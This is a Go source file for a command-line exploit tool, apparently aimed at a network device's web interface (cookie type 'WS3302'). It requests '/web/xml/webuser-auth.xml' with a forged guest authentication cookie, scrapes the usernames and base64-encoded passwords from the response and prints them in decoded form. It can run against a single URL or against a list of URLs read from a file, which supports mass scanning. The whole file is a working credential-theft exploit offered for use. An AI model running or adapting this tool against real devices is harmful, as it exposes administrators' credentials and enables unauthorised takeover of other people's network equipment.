package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
	"time"
)
var (
	GetURlPath string
	GetURL string
)
func init(){
	flag.StringVar(&GetURlPath,"t","","The text that holds the URL")
	flag.StringVar(&GetURL,"u","","The URL address to be exploited")
	flag.Parse()
}
func OpenURLFile(path string) ([]string,error) {
	file,err := os.Open(path)
	if err != nil {
		os.Exit(0)
	}
	var readlines []string /*定义一个空切片用于存储遍历后的数据*/
	buf := bufio.NewReader(file) /*建立一个缓冲区，将文本内容写入缓冲区*/
	for {
		data,_,errR := buf.ReadLine() /*读取到\n截至*/
		if errR != nil {
			if errR == io.EOF{
				break
			}
			return readlines, errR
		}
		readlines = append(readlines,string(data)) /*将去除换行符的字符串写入切片*/
	}
	return readlines ,nil
}

func decodeMsg(response *http.Response)error{
	body,err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	Name,err := regexp.Compile(`<user><name><!\[CDATA\[   (.*?)\]\]></name>`)
	Pass,err := regexp.Compile(`<password><!\[CDATA\[   (.*?)\]\]></password>`)
	if err != nil {
		fmt.Println(err)
	}
	resultName := Name.FindAllStringSubmatch(string(body), -1)
	resultPass := Pass.FindAllStringSubmatch(string(body), -1)
	for keyName,valueName:= range resultName{
		for keyPass,valuePass := range resultPass{
			if keyName == keyPass{
				value,_ := base64.StdEncoding.DecodeString(valuePass [1])
				fmt.Println("[+] "+valueName[1]+"->",string(value))
			}
		}
	}
	return nil
}


func getUser_Password(url string)(error){
	cookieJar, _ := cookiejar.New(nil)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	NewURl := url + "/web/xml/webuser-auth.xml"
	client := &http.Client{Timeout: time.Second*5,Jar: cookieJar,Transport: tr}
	request,err := http.NewRequest("GET",NewURl,nil)
	if err != nil {
		return fmt.Errorf("The establishment of the http request failed")
	}
	request.Header.Set("User-Agent","Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	request.Header.Set("Cookie","auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.21; type=WS3302")
	resp,err := client.Do(request)
	if err != nil {
		return fmt.Errorf("The request for the target network failed")
	}
	if resp.StatusCode == 200 {
		fmt.Println("[+] 用户密码泄露,正在解密...")
		err := decodeMsg(resp)
		if err != nil {
			return err
		}
	}else{
		fmt.Println("[-] 用户密码可能未泄露")
		return nil
	}
	return nil
}


func main(){
	if GetURL != ""{
		err := getUser_Password(GetURL)
		if err != nil {
			fmt.Println(err)
		}
	}else if GetURlPath != ""{
		urllist,err := OpenURLFile(GetURlPath)
		if err != nil {
			fmt.Println(err)
		}
		for _,url := range urllist{
			err := getUser_Password(url)
			if err != nil {
				fmt.Println(err)
			}
		}
	}

}